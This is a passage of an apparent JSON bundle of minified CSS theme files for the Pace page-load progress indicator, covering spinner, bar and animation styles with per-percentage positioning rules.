.pace-progress{position:fixed;z-index:2000;top:0;right:0;height:5rem;width:5rem;-webkit-transform:translate3d(0,0,0)!important;-ms-transform:translate3d(0,0,0)!important;transform:translate3d(0,0,0)!important}.pace .pace-progress:after{display:block;position:absolute;top:0;right:.5rem;content:attr(data-progress-text);font-family:\"Helvetica Neue\",sans-serif;font-weight:100;font-size:5rem;line-height:1;text-align:right;color:rgba(34,153,221,.19999999999999996)}"},{"url":"/lib/pace/pace-theme-bounce.min.css","content":".pace{width:140px;height:300px;position:fixed;top:-90px;right:-20px;z-index:2000;-webkit-transform:scale(0);-moz-transform:scale(0);-ms-transform:scale(0);-o-transform:scale(0);transform:scale(0);opacity:0;-webkit-transition:all 2s linear 0s;-moz-transition:all 2s linear 0s;transition:all 2s linear 0s}.pace.pace-active{-webkit-transform:scale(.25);-moz-transform:scale(.25);-ms-transform:scale(.25);-o-transform:scale(.25);transform:scale(.25);opacity:1}.pace .pace-activity{width:140px;height:140px;border-radius:70px;background:#29d;position:absolute;top:0;z-index:1911;-webkit-animation:pace-bounce 1s infinite;-moz-animation:pace-bounce 1s infinite;-o-animation:pace-bounce 1s infinite;-ms-animation:pace-bounce 1s infinite;animation:pace-bounce 1s infinite}.pace .pace-progress{position:absolute;display:block;left:50%;bottom:0;z-index:1910;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-webkit-transform:scaleY(.3)!important;-moz-transform:scaleY(.3)!important;-ms-transform:scaleY(.3)!important;-o-transform:scaleY(.3)!important;transform:scaleY(.3)!important;-webkit-animation:pace-compress .5s infinite alternate;-moz-animation:pace-compress .5s infinite alternate;-o-animation:pace-compress .5s infinite alternate;-ms-animation:pace-compress .5s infinite alternate;animation:pace-compress .5s infinite alternate}@-webkit-keyframes pace-bounce{0%,100%,95%{top:0;-webkit-animation-timing-function:ease-in}50%{top:140px;height:140px;-webkit-animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;-webkit-animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;-webkit-animation-timing-function:ease-out}}@-moz-keyframes pace-bounce{0%,100%,95%{top:0;-moz-animation-timing-function:ease-in}50%{top:140px;height:140px;-moz-animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;-moz-animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;-moz-animation-timing-function:ease-out}}@keyframes pace-bounce{0%,100%,95%{top:0;animation-timing-function:ease-in}50%{top:140px;height:140px;animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;animation-timing-function:ease-out}}@-webkit-keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-webkit-animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;-webkit-animation-timing-function:ease-out}}@-moz-keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-moz-animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;-moz-animation-timing-function:ease-out}}@keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;animation-timing-function:ease-out}}"},{"url":"/lib/pace/pace-theme-center-atom.min.css","content":".pace,.pace .pace-progress{z-index:2000;height:60px;width:100px}.pace .pace-activity,.pace .pace-progress:before{border-radius:50%;display:block;position:absolute}.pace.pace-inactive{display:none}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0}.pace .pace-progress{position:absolute;-webkit-transform:translate3d(0,0,0)!important;-ms-transform:translate3d(0,0,0)!important;transform:translate3d(0,0,0)!important}.pace .pace-progress:before{content:attr(data-progress-text);text-align:center;color:#fff;background:#29d;font-family:\"Helvetica Neue\",sans-serif;font-size:14px;font-weight:100;line-height:1;padding:20% 0 7px;width:50%;height:40%;margin:10px 0 0 30px;z-index:999}.pace .pace-activity{font-size:15px;line-height:1;z-index:2000;-webkit-animation:pace-theme-center-atom-spin 2s linear infinite;-moz-animation:pace-theme-center-atom-spin 2s linear infinite;-o-animation:pace-theme-center-atom-spin 2s linear infinite;animation:pace-theme-center-atom-spin 2s linear infinite;border:5px solid #29d;content:' ';top:0;left:0;height:60px;width:100px}.pace .pace-activity:after,.pace .pace-activity:before{content:' ';display:block;position:absolute;top:-5px;left:-5px;height:60px;width:100px}.pace .pace-activity:after{border-radius:50%;border:5px solid #29d;-webkit-transform:rotate(60deg);-moz-transform:rotate(60deg);-o-transform:rotate(60deg);transform:rotate(60deg)}.pace .pace-activity:before{border-radius:50%;border:5px solid #29d;-webkit-transform:rotate(120deg);-moz-transform:rotate(120deg);-o-transform:rotate(120deg);transform:rotate(120deg)}@-webkit-keyframes pace-theme-center-atom-spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(359deg)}}@-moz-keyframes pace-theme-center-atom-spin{0%{-moz-transform:rotate(0)}100%{-moz-transform:rotate(359deg)}}@-o-keyframes pace-theme-center-atom-spin{0%{-o-transform:rotate(0)}100%{-o-transform:rotate(359deg)}}@keyframes pace-theme-center-atom-spin{0%{transform:rotate(0)}100%{transform:rotate(359deg)}}"},{"url":"/lib/pace/pace-theme-center-circle.min.css","content":".pace,.pace .pace-progress{z-index:2000;left:0;top:0;height:6rem}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;-webkit-perspective:12rem;-moz-perspective:12rem;-ms-perspective:12rem;-o-perspective:12rem;perspective:12rem;position:fixed;width:6rem;margin:auto;right:0;bottom:0}.pace.pace-inactive .pace-progress{display:none}.pace .pace-progress{display:block;position:absolute;width:6rem!important;line-height:6rem;font-size:2rem;border-radius:50%;background:rgba(34,153,221,.8);color:#fff;font-family:\"Helvetica Neue\",sans-serif;font-weight:100;text-align:center;-webkit-animation:pace-theme-center-circle-spin linear infinite 2s;-moz-animation:pace-theme-center-circle-spin linear infinite 2s;-ms-animation:pace-theme-center-circle-spin linear infinite 2s;-o-animation:pace-theme-center-circle-spin linear infinite 2s;animation:pace-theme-center-circle-spin linear infinite 2s;-webkit-transform-style:preserve-3d;-moz-transform-style:preserve-3d;-ms-transform-style:preserve-3d;-o-transform-style:preserve-3d;transform-style:preserve-3d}.pace .pace-progress:after{content:attr(data-progress-text);display:block}@-webkit-keyframes pace-theme-center-circle-spin{from{-webkit-transform:rotateY(0)}to{-webkit-transform:rotateY(360deg)}}@-moz-keyframes pace-theme-center-circle-spin{from{-moz-transform:rotateY(0)}to{-moz-transform:rotateY(360deg)}}@-ms-keyframes pace-theme-center-circle-spin{from{-ms-transform:rotateY(0)}to{-ms-transform:rotateY(360deg)}}@-o-keyframes pace-theme-center-circle-spin{from{-o-transform:rotateY(0)}to{-o-transform:rotateY(360deg)}}@keyframes pace-theme-center-circle-spin{from{transform:rotateY(0)}to{transform:rotateY(360deg)}}"},{"url":"/lib/pace/pace-theme-center-radar.min.css","content":".pace,.pace .pace-activity{z-index:2000;height:90px;width:90px}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0}.pace.pace-inactive .pace-activity{display:none}.pace .pace-activity,.pace .pace-activity:before{position:absolute;display:block;border-color:#29d transparent transparent;border-radius:50%}.pace .pace-activity{left:-30px;top:-30px;border-width:30px;border-style:double;-webkit-animation:spin 1s linear infinite;-moz-animation:spin 1s linear infinite;-o-animation:spin 1s linear infinite;animation:spin 1s linear infinite}.pace .pace-activity:before{content:' ';top:10px;left:10px;height:50px;width:50px;border-width:10px;border-style:solid}@-webkit-keyframes spin{100%{-webkit-transform:rotate(359deg)}}@-moz-keyframes spin{100%{-moz-transform:rotate(359deg)}}@-o-keyframes spin{100%{-moz-transform:rotate(359deg)}}@keyframes spin{100%{transform:rotate(359deg)}}"},{"url":"/lib/pace/pace-theme-center-simple.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0;height:5px;width:200px;background:#fff;border:1px solid #29d;overflow:hidden}.pace .pace-progress{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);transform:translate3d(0,0,0);max-width:200px;z-index:2000;display:block;position:absolute;top:0;right:100%;height:100%;width:100%;background:#29d}.pace.pace-inactive{display:none}"},{"url":"/lib/pace/pace-theme-corner-indicator.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace .pace-activity{display:block;position:fixed;z-index:2000;top:0;right:0;width:300px;height:300px;background:#29d;-webkit-transition:-webkit-transform .3s;transition:transform .3s;-webkit-transform:translateX(100%) translateY(-100%) rotate(45deg);transform:translateX(100%) translateY(-100%) rotate(45deg);pointer-events:none}.pace.pace-active .pace-activity{-webkit-transform:translateX(50%) translateY(-50%) rotate(45deg);transform:translateX(50%) translateY(-50%) rotate(45deg)}.pace .pace-activity::after,.pace .pace-activity::before{-moz-box-sizing:border-box;box-sizing:border-box;position:absolute;bottom:30px;left:50%;display:block;border:5px solid #fff;border-radius:50%;content:''}.pace .pace-activity::before{margin-left:-40px;width:80px;height:80px;border-right-color:rgba(0,0,0,.2);border-left-color:rgba(0,0,0,.2);-webkit-animation:pace-theme-corner-indicator-spin 3s linear infinite;animation:pace-theme-corner-indicator-spin 3s linear infinite}.pace .pace-activity::after{bottom:50px;margin-left:-20px;width:40px;height:40px;border-top-color:rgba(0,0,0,.2);border-bottom-color:rgba(0,0,0,.2);-webkit-animation:pace-theme-corner-indicator-spin 1s linear infinite;animation:pace-theme-corner-indicator-spin 1s linear infinite}@-webkit-keyframes pace-theme-corner-indicator-spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(359deg)}}@keyframes pace-theme-corner-indicator-spin{0%{transform:rotate(0)}100%{transform:rotate(359deg)}}"},{"url":"/lib/pace/pace-theme-fill-left.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background-color:rgba(34,153,221,.19999999999999996);position:fixed;z-index:-1;top:0;right:100%;bottom:0;width:100%}"},{"url":"/lib/pace/pace-theme-flash.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#29d;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}.pace .pace-progress-inner{display:block;position:absolute;right:0;width:100px;height:100%;box-shadow:0 0 10px #29d,0 0 5px #29d;opacity:1;-webkit-transform:rotate(3deg) translate(0,-4px);-moz-transform:rotate(3deg) translate(0,-4px);-ms-transform:rotate(3deg) translate(0,-4px);-o-transform:rotate(3deg) translate(0,-4px);transform:rotate(3deg) translate(0,-4px)}.pace .pace-activity{display:block;position:fixed;z-index:2000;top:15px;right:15px;width:14px;height:14px;border:2px solid transparent;border-top-color:#29d;border-left-color:#29d;border-radius:10px;-webkit-animation:pace-spinner .4s linear infinite;-moz-animation:pace-spinner .4s linear infinite;-ms-animation:pace-spinner .4s linear infinite;-o-animation:pace-spinner .4s linear infinite;animation:pace-spinner .4s linear infinite}@-webkit-keyframes pace-spinner{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@-moz-keyframes pace-spinner{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-o-keyframes pace-spinner{0%{-o-transform:rotate(0);transform:rotate(0)}100%{-o-transform:rotate(360deg);transform:rotate(360deg)}}@-ms-keyframes pace-spinner{0%{-ms-transform:rotate(0);transform:rotate(0)}100%{-ms-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes pace-spinner{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}"},{"url":"/lib/pace/pace-theme-flat-top.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;position:fixed;top:0;left:0;width:100%;-webkit-transform:translate3d(0,-50px,0);-ms-transform:translate3d(0,-50px,0);transform:translate3d(0,-50px,0);-webkit-transition:-webkit-transform .5s ease-out;-ms-transition:-webkit-transform .5s ease-out;transition:transform .5s ease-out}.pace.pace-active{-webkit-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}.pace .pace-progress{display:block;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:10px;background:#29d;pointer-events:none}\n"},{"url":"/lib/pace/pace-theme-loading-bar.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-border-radius:10px;-moz-border-radius:10px;border-radius:10px;-webkit-background-clip:padding-box;-moz-background-clip:padding;background-clip:padding-box;z-index:2000;position:fixed;margin:auto;top:12px;left:0;right:0;bottom:0;width:200px;height:50px;overflow:hidden}.pace .pace-progress{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;-webkit-background-clip:padding-box;-moz-background-clip:padding;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);display:block;position:absolute;right:100%;margin-right:-7px;width:93%;top:7px;height:14px;font-size:12px;background:#29d;color:#29d;line-height:60px;font-weight:700;font-family:Helvetica,Arial,\"Lucida Grande\",sans-serif;-webkit-box-shadow:120px 0 #fff,240px 0 #fff;-ms-box-shadow:120px 0 #fff,240px 0 #fff;box-shadow:120px 0 #fff,240px 0 #fff}.pace .pace-progress:after{content:attr(data-progress-text);display:inline-block;position:fixed;width:45px;text-align:right;right:0;padding-right:16px;top:4px}.pace .pace-progress[data-progress-text=\"0%\"]:after{right:-200px}.pace .pace-progress[data-progress-text=\"1%\"]:after{right:-198.14px}.pace .pace-progress[data-progress-text=\"2%\"]:after{right:-196.28px}.pace .pace-progress[data-progress-text=\"3%\"]:after{right:-194.42px}.pace .pace-progress[data-progress-text=\"4%\"]:after{right:-192.56px}.pace .pace-progress[data-progress-text=\"5%\"]:after{right:-190.7px}.pace .pace-progress[data-progress-text=\"6%\"]:after{right:-188.84px}.pace .pace-progress[data-progress-text=\"7%\"]:after{right:-186.98px}.pace .pace-progress[data-progress-text=\"8%\"]:after{right:-185.12px}.pace .pace-progress[data-progress-text=\"9%\"]:after{right:-183.26px}.pace .pace-progress[data-progress-text=\"10%\"]:after{right:-181.4px}.pace .pace-progress[data-progress-text=\"11%\"]:after{right:-179.54px}.pace .pace-progress[data-progress-text=\"12%\"]:after{right:-177.68px}.pace .pace-progress[data-progress-text=\"13%\"]:after{right:-175.82px}.pace .pace-progress[data-progress-text=\"14%\"]:after{right:-173.96px}.pace .pace-progress[data-progress-text=\"15%\"]:after{right:-172.1px}.pace .pace-progress[data-progress-text=\"16%\"]:after{right:-170.24px}.pace .pace-progress[data-progress-text=\"17%\"]:after{right:-168.38px}.pace .pace-progress[data-progress-text=\"18%\"]:after{right:-166.52px}.pace .pace-progress[data-progress-text=\"19%\"]:after{right:-164.66px}.pace .pace-progress[data-progress-text=\"20%\"]:after{right:-162.8px}.pace .pace-progress[data-progress-text=\"21%\"]:after{right:-160.94px}.pace .pace-progress[data-progress-text=\"22%\"]:after{right:-159.08px}.pace .pace-progress[data-progress-text=\"23%\"]:after{right:-157.22px}.pace .pace-progress[data-progress-text=\"24%\"]:after{right:-155.36px}.pace .pace-progress[data-progress-text=\"25%\"]:after{right:-153.5px}.pace .pace-progress[data-progress-text=\"26%\"]:after{right:-151.64px}.pace .pace-progress[data-progress-text=\"27%\"]:after{right:-149.78px}.pace .pace-progress[data-progress-text=\"28%\"]:after{right:-147.92px}.pace .pace-progress[data-progress-text=\"29%\"]:after{right:-146.06px}.pace .pace-progress[data-progress-text=\"30%\"]:after{right:-144.2px}.pace .pace-progress[data-progress-text=\"31%\"]:after{right:-142.34px}.pace .pace-progress[data-progress-text=\"32%\"]:after{right:-140.48px}.pace .pace-progress[data-progress-text=\"33%\"]:after{right:-138.62px}.pace .pace-progress[data-progress-text=\"34%\"]:after{right:-136.76px}.pace .pace-progress[data-progress-text=\"35%\"]:after{right:-134.9px}.pace .pace-progress[data-progress-text=\"36%\"]:after{right:-133.04px}.pace .pace-progress[data-progress-text=\"37%\"]:after{right:-131.18px}.pace .pace-progress[data-progress-text=\"38%\"]:after{right:-129.32px}.pace .pace-progress[data-progress-text=\"39%\"]:after{right:-127.46px}.pace .pace-progress[data-progress-text=\"40%\"]:after{right:-125.6px}.pace .pace-progress[data-progress-text=\"41%\"]:after{right:-123.74px}.pace .pace-progress[data-progress-text=\"42%\"]:after{right:-121.88px}.pace .pace-progress[data-progress-text=\"43%\"]:after{right:-120.02px}.pace .pace-progress[data-progress-text=\"44%\"]:after{right:-118.16px}.pace .pace-progress[data-progress-text=\"45%\"]:after{right:-116.3px}.pace .pace-progress[data-progress-text=\"46%\"]:after{right:-114.44px}.pace .pace-progress[data-progress-text=\"47%\"]:after{right:-112.58px}.pace .pace-progress[data-progress-text=\"48%\"]:after{right:-110.72px}.pace .pace-progress[data-progress-text=\"49%\"]:after{right:-108.86px}.pace .pace-progress[data-progress-text=\"50%\"]:after{right:-107px}.pace .pace-progress[data-progress-text=\"51%\"]:after{right:-105.14px}.pace .pace-progress[data-progress-text=\"52%\"]:after{right:-103.28px}.pace .pace-progress[data-progress-text=\"53%\"]:after{right:-101.42px}.pace .pace-progress[data-progress-text=\"54%\"]:after{right:-99.56px}.pace .pace-progress[data-progress-text=\"55%\"]:after{right:-97.7px}.pace .pace-progress[data-progress-text=\"56%\"]:after{right:-95.84px}.pace .pace-progress[data-progress-text=\"57%\"]:after{right:-93.98px}.pace .pace-progress[data-progress-text=\"58%\"]:after{right:-92.12px}.pace .pace-progress[data-progress-text=\"59%\"]:after{right:-90.26px}.pace .pace-progress[data-progress-text=\"60%\"]:after{right:-88.4px}.pace .pace-progress[data-progress-text=\"61%\"]:after{right:-86.54px}.pace .pace-progress[data-progress-text=\"62%\"]:after{right:-84.68px}.pace .pace-progress[data-progress-text=\"63%\"]:after{right:-82.82px}.pace .pace-progress[data-progress-text=\"64%\"]:after{right:-80.96px}.pace .pace-progress[data-progress-text=\"65%\"]:after{right:-79.1px}.pace .pace-progress[data-progress-text=\"66%\"]:after{right:-77.24px}.pace .pace-progress[data-progress-text=\"67%\"]:after{right:-75.38px}.pace .pace-progress[data-progress-text=\"68%\"]:after{right:-73.52px}.pace .pace-progress[data-progress-text=\"69%\"]:after{right:-71.66px}.pace .pace-progress[data-progress-text=\"70%\"]:after{right:-69.8px}.pace .pace-progress[data-progress-text=\"71%\"]:after{right:-67.94px}.pace .pace-progress[data-progress-text=\"72%\"]:after{right:-66.08px}.pace .pace-progress[data-progress-text=\"73%\"]:after{right:-64.22px}.pace .pace-progress[data-progress-text=\"74%\"]:after{right:-62.36px}.pace .pace-progress[data-progress-text=\"75%\"]:after{right:-60.5px}.pace .pace-progress[data-progress-text=\"76%\"]:after{right:-58.64px}.pace .pace-progress[data-progress-text=\"77%\"]:after{right:-56.78px}.pace .pace-progress[data-progress-text=\"78%\"]:after{right:-54.92px}.pace .pace-progress[data-progress-text=\"79%\"]:after{right:-53.06px}.pace .pace-progress[data-progress-text=\"80%\"]:after{right:-51.2px}.pace .pace-progress[data-progress-text=\"81%\"]:after{right:-49.34px}.pace .pace-progress[data-progress-text=\"82%\"]:after{right:-47.48px}.pace .pace-progress[data-progress-text=\"83%\"]:after{right:-45.62px}.pace .pace-progress[data-progress-text=\"84%\"]:after{right:-43.76px}.pace .pace-progress[data-progress-text=\"85%\"]:after{right:-41.9px}.pace .pace-progress[data-progress-text=\"86%\"]:after{right:-40.04px}.pace .pace-progress[data-progress-text=\"87%\"]:after{right:-38.18px}.pace .pace-progress[data-progress-text=\"88%\"]:after{right:-36.32px}.pace .pace-progress[data-progress-text=\"89%\"]:after{right:-34.46px}.pace .pace-progress[data-progress-text=\"90%\"]:after{right:-32.6px}.pace .pace-progress[data-progress-text=\"91%\"]:after{right:-30.74px}.pace .pace-progress[data-progress-text=\"92%\"]:after{right:-28.88px}.pace .pace-progress[data-progress-text=\"93%\"]:after{right:-27.02px}.pace .pace-progress[data-progress-text=\"94%\"]:after{right:-25.16px}.pace .pace-progress[data-progress-text=\"95%\"]:after{right:-23.3px}.pace .pace-progress[data-progress-text=\"96%\"]:after{right:-21.44px}.pace .pace-progress[data-progress-text=\"97%\"]:after{right:-19.58px}.pace .pace-progress[data-progress-text=\"98%\"]:after{right:-17.72px}.pace .pace-progress[data-progress-text=\"99%\"]:after{right:-15.86px}.pace .pace-progress[data-progress-text=\"100%\"]:after{right:-14px}.pace .pace-activity{position:absolute;width:100%;height:28px;z-index:2001;box-shadow:inset 0 0 0 2px #29d,inset 0 0 0 7px #FFF;border-radius:10px}.pace.pace-inactive{display:none}"},{"url":"/lib/pace/pace-theme-mac-osx.min.css","content":".pace,.pace .pace-progress{width:100%;height:12px;overflow:hidden}.pace,.pace .pace-activity{position:fixed;top:0;left:0}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;background:#fff}.pace-inactive{display:none}.pace .pace-progress{background-color:#0087E1;position:fixed;top:0;right:100%;-webkit-border-radius:0 0 4px;-moz-border-radius:0 0 4px;-o-border-radius:0 0 4px;border-radius:0 0 4px;-webkit-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);-moz-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);-o-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3)}.pace .pace-activity{right:-28px;bottom:0;-webkit-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-moz-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-o-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-webkit-background-size:28px 100%;-moz-background-size:28px 100%;-o-background-size:28px 100%;background-size:28px 100%;-webkit-animation:pace-theme-mac-osx-motion .5s linear infinite;-moz-animation:pace-theme-mac-osx-motion .5s linear infinite;-ms-animation:pace-theme-mac-osx-motion .5s linear infinite;-o-animation:pace-theme-mac-osx-motion .5s linear infinite;animation:pace-theme-mac-osx-motion .5s linear infinite}@-webkit-keyframes pace-theme-mac-osx-motion{0%{-webkit-transform:none;transform:none}100%{-webkit-transform:translate(-28px,0);transform:translate(-28px,0)}}@-moz-keyframes pace-theme-mac-osx-motion{0%{-moz-transform:none;transform:none}100%{-moz-transform:translate(-28px,0);transform:translate(-28px,0)}}@-o-keyframes pace-theme-mac-osx-motion{0%{-o-transform:none;transform:none}100%{-o-transform:translate(-28px,0);transform:translate(-28px,0)}}@-ms-keyframes pace-theme-mac-osx-motion{0%{-ms-transform:none;transform:none}100%{-ms-transform:translate(-28px,0);transform:translate(-28px,0)}}@keyframes pace-theme-mac-osx-motion{0%{transform:none}100%{transform:translate(-28px,0)}}"},{"url":"/lib/pace/pace-theme-material.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;color:#29d}.pace-progress{position:fixed;z-index:2000;top:50%;left:50%;margin-left:-2.5rem;margin-top:-2.5rem;height:5rem;width:5rem;opacity:1;-webkit-transition:opacity .1s;transition:opacity .1s;-webkit-transform:translate3d(0,0,0)!important;-ms-transform:translate3d(0,0,0)!important;transform:translate3d(0,0,0)!important}.pace-inactive .pace-progress,.pace-progress[data-progress=\"00\"]{opacity:0}.pace-progress:after{height:5rem;width:5rem;text-align:center;line-height:5rem;content:attr(data-progress);display:block;font-size:1.8rem;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:300}.pace-progress .pace-progress-inner{overflow:hidden;position:absolute;width:2.5rem;height:5rem;-webkit-transform-origin:left center;-ms-transform-origin:left center;transform-origin:left center;-webkit-transition:-webkit-transform .1s;transition:transform .1s;left:2.5rem;top:0}.pace-progress .pace-progress-inner:after,.pace-progress .pace-progress-inner:before{position:absolute;width:5rem;height:5rem;content:' ';left:-2.5rem;top:0;box-sizing:border-box;border:1px solid;border-radius:5rem}.pace-progress .pace-progress-inner:before{border-right-color:transparent;border-bottom-color:transparent;-webkit-transform:rotate(135deg);-ms-transform:rotate(135deg);transform:rotate(135deg)}.pace-progress .pace-progress-inner:after{border-left-color:transparent;border-top-color:transparent;display:none;-webkit-transform:rotate(315deg);-ms-transform:rotate(315deg);transform:rotate(315deg)}.pace-progress[data-progress=\"00\"] .pace-progress-inner:before{-webkit-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg)}.pace-progress[data-progress=\"01\"] .pace-progress-inner:before{-webkit-transform:rotate(-41deg);-ms-transform:rotate(-41deg);transform:rotate(-41deg)}.pace-progress[data-progress=\"02\"] .pace-progress-inner:before{-webkit-transform:rotate(-38deg);-ms-transform:rotate(-38deg);transform:rotate(-38deg)}.pace-progress[data-progress=\"03\"] .pace-progress-inner:before{-webkit-transform:rotate(-34deg);-ms-transform:rotate(-34deg);transform:rotate(-34deg)}.pace-progress[data-progress=\"04\"] .pace-progress-inner:before{-webkit-transform:rotate(-31deg);-ms-transform:rotate(-31deg);transform:rotate(-31deg)}.pace-progress[data-progress=\"05\"] .pace-progress-inner:before{-webkit-transform:rotate(-27deg);-ms-transform:rotate(-27deg);transform:rotate(-27deg)}.pace-progress[data-progress=\"06\"] .pace-progress-inner:before{-webkit-transform:rotate(-23deg);-ms-transform:rotate(-23deg);transform:rotate(-23deg)}.pace-progress[data-progress=\"07\"] .pace-progress-inner:before{-webkit-transform:rotate(-20deg);-ms-transform:rotate(-20deg);transform:rotate(-20deg)}.pace-progress[data-progress=\"08\"] .pace-progress-inner:before{-webkit-transform:rotate(-16deg);-ms-transform:rotate(-16deg);transform:rotate(-16deg)}.pace-progress[data-progress=\"09\"] .pace-progress-inner:before{-webkit-transform:rotate(-13deg);-ms-transform:rotate(-13deg);transform:rotate(-13deg)}.pace-progress[data-progress=\"10\"] .pace-progress-inner:before{-webkit-transform:rotate(-9deg);-ms-transform:rotate(-9deg);transform:rotate(-9deg)}.pace-progress[data-progress=\"11\"] .pace-progress-inner:before{-webkit-transform:rotate(-5deg);-ms-transform:rotate(-5deg);transform:rotate(-5deg)}.pace-progress[data-progress=\"12\"] .pace-progress-inner:before{-webkit-transform:rotate(-2deg);-ms-transform:rotate(-2deg);transform:rotate(-2deg)}.pace-progress[data-progress=\"13\"] .pace-progress-inner:before{-webkit-transform:rotate(2deg);-ms-transform:rotate(2deg);transform:rotate(2deg)}.pace-progress[data-progress=\"14\"] .pace-progress-inner:before{-webkit-transform:rotate(5deg);-ms-transform:rotate(5deg);transform:rotate(5deg)}.pace-progress[data-progress=\"15\"] .pace-progress-inner:before{-webkit-transform:rotate(9deg);-ms-transform:rotate(9deg);transform:rotate(9deg)}.pace-progress[data-progress=\"16\"] .pace-progress-inner:before{-webkit-transform:rotate(13deg);-ms-transform:rotate(13deg);transform:rotate(13deg)}.pace-progress[data-progress=\"17\"] .pace-progress-inner:before{-webkit-transform:rotate(16deg);-ms-transform:rotate(16deg);transform:rotate(16deg)}.pace-progress[data-progress=\"18\"] .pace-progress-inner:before{-webkit-transform:rotate(20deg);-ms-transform:rotate(20deg);transform:rotate(20deg)}.pace-progress[data-progress=\"19\"] .pace-progress-inner:before{-webkit-transform:rotate(23deg);-ms-transform:rotate(23deg);transform:rotate(23deg)}.pace-progress[data-progress=\"20\"] .pace-progress-inner:before{-webkit-transform:rotate(27deg);-ms-transform:rotate(27deg);transform:rotate(27deg)}.pace-progress[data-progress=\"21\"] .pace-progress-inner:before{-webkit-transform:rotate(31deg);-ms-transform:rotate(31deg);transform:rotate(31deg)}.pace-progress[data-progress=\"22\"] 